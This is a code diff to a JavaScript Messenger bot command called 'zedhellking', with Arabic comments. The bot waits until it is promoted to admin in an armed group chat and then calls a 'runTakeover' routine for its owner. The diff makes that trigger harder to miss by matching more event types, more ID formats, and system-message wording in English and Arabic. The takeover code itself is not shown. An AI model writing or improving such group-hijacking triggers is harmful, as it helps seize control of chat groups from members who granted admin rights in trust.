@@ -73,13 +73,16 @@ function createZedHellkingCommand(options = {}) {
     runs.clear();
   }
 
-  function adminIDsFromEvent(event) {
+  function promotedIDsFromEvent(event) {
     const logData = (event && event.logMessageData) || {};
     const raw = logData.ADMIN_IDS || logData.adminIDs || logData.ADMIN_ID || [];
-    if (Array.isArray(raw)) return raw.map((id) => String(id || "")).filter(Boolean);
-    return String(raw || "")
-      .split(",")
-      .map((id) => id.trim())
+    let ids = [];
+    if (Array.isArray(raw)) ids = raw;
+    else if (typeof raw === "string") ids = raw.split(",");
+    else if (typeof raw === "object" && raw)
+      ids = [...Object.keys(raw), ...Object.values(raw)];
+    return ids
+      .map((id) => String(id || "").trim())
       .filter(Boolean);
   }
 
@@ -194,18 +197,45 @@ function createZedHellkingCommand(options = {}) {
     }
   }
 
-  async function handleAdminAddEvent(api, event) {
+  async function handleEvent(api, event) {
     const threadID = String((event && event.threadID) || "");
     const ownerID = armedOwners.get(threadID);
     if (!threadID || !ownerID) return;
-    if (String(event.logMessageType || event.type || "") !== "log:thread-admins") return;
 
-    // الحماية تعمل فقط عندما يكون البوت نفسه هو المُعيَّن مسؤولاً.
-    const promoted = adminIDsFromEvent(event);
     const botID = String((api.getCurrentUserID && api.getCurrentUserID()) || "");
-    if (!promoted.includes(botID)) return;
+    const logType = String(event.logMessageType || event.type || "");
 
-    await runTakeover(api, threadID, ownerID, actorFromEvent(event));
+    // 1) الحدث الرسمي لتغيير المسؤولين — بأي صيغة يحملها اسم admin.
+    if (/admin/i.test(logType)) {
+      const promoted = promotedIDsFromEvent(event);
+      if (promoted.includes(botID)) {
+        await runTakeover(api, threadID, ownerID, actorFromEvent(event));
+      }
+      return;
+    }
+
+    // 2) احتياطي: رسالة النظام التي يعلن فيها ميسنجر عن التعيين.
+    const body = String(event.body || "");
+    if (!body) return;
+    if (!/(admin|مسؤول)/i.test(body)) return;
+    if (/(removed|أُزيل|أزيل|ازيل|كفأ|كفأه|unadmin)/i.test(body)) return;
+    if (!/(added as|as (a )?(group )?admin|promoted|تعيين|عيّن|عين|كمسؤول|مسؤولا|ترقية)/i.test(body))
+      return;
+
+    // ننتظر قليلاً حتى تستقر حالة المشرفين ثم نتحقق مباشرة مما إذا كان البوت نفسه هو المُعيَّن.
+    await delay(1500);
+    try {
+      const info = await api.getThreadInfo(threadID);
+      const admins = adminIDsFromInfo(info);
+      if (admins.includes(botID)) {
+        await runTakeover(api, threadID, ownerID, actorFromEvent(event));
+      }
+    } catch (error) {
+      console.error(
+        "[zedhellking] تعذر التحقق من مشرفي المجموعة:",
+        (error && error.message) || error,
+      );
+    }
   }
 
   async function execute(api, event, isAdmin) {
@@ -242,7 +272,7 @@ function createZedHellkingCommand(options = {}) {
   return {
     name: "zedhellking",
     execute,
-    handleAdminAddEvent,
+    handleEvent,
     stopAll,
   };
 }
